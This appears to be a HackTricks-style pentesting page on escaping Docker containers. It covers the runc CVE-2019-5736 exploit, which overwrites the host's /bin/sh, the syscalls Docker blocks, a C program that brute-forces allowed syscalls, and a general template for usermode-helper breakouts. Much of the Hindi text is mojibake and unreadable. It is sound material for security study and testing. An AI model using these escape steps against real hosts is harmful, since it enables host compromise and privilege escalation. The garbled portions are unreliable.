[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХреЛ рдмрдирд╛ рд╕рдХреЗрдВ** рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХреЗрдВ** рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ (CVE-2019-5736)

рдпрджрд┐ рдЖрдк `docker exec` рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж sudo рдХреЗ рд╕рд╛рде), рддреЛ рдЖрдк CVE-2019-5736 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ [рдпрд╣рд╛рдБ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **рд╣реЛрд╕реНрдЯ** рдХреЗ _**/bin/sh**_ рдмрд╛рдЗрдирд░реА рдХреЛ **рдХрдВрдЯреЗрдирд░ рд╕реЗ** **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА рдЬреЛ docker exec рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рдкреЗрд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреЗрд▓реЛрдб рдХреЛ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓реЗрдВ рдФрд░ `go build main.go` рдХреЗ рд╕рд╛рде main.go рдХреЛ рдмрд┐рд▓реНрдб рдХрд░реЗрдВред рдкрд░рд┐рдгрд╛рдореА рдмрд╛рдЗрдирд░реА рдХреЛ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдирд┐рд╖реНрдкрд╛рджрди рдкрд░, рдЬреИрд╕реЗ рд╣реА рдпрд╣ `[+] Overwritten /bin/sh successfully` рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

`docker exec -it <container-name> /bin/sh`

рдпрд╣ рдореБрдЦреНрдп.go рдлрд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рдкреЗрд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
рдХрдВрдЯреЗрдирд░ рдЕрдиреНрдп CVEs рдХреЗ рд▓рд┐рдП рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЖрдк рдПрдХ рд╕реВрдЪреА [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **рдиреЗрдорд╕реНрдкреЗрд╕:** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд▓рдЧ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рд╣рдо рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдХрд╛рд░рдг рдЕрдиреНрдп рдкреНрд░реЛрдХреНрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ IPCs, рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯреНрд╕, рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ, D-Bus, `/proc` рдЕрдиреНрдп рдкреНрд░реЛрдХреНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ).
* **рд░реВрдЯ рдпреВрдЬрд░**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдпреВрдЬрд░ рд░реВрдЯ рдпреВрдЬрд░ рд╣реЛрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реАрдорд┐рдд рд╣реЛрддреЗ рд╣реИрдВ).
* **рдХреНрд╖рдорддрд╛рдПрдВ**: Docker рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖рдорддрд╛рдПрдВ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: рдпреЗ рд╡реЗ syscalls рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ **рд░реВрдЯ рдпреВрдЬрд░ рдХреЙрд▓ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧрд╛** (рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдХрдореА + Seccomp рдХреЗ рдХрд╛рд░рдг). рдЕрдиреНрдп syscalls рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрдЪрдиреЗ рдХреЗ рдкреНрд░рдпрд╛рд╕ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
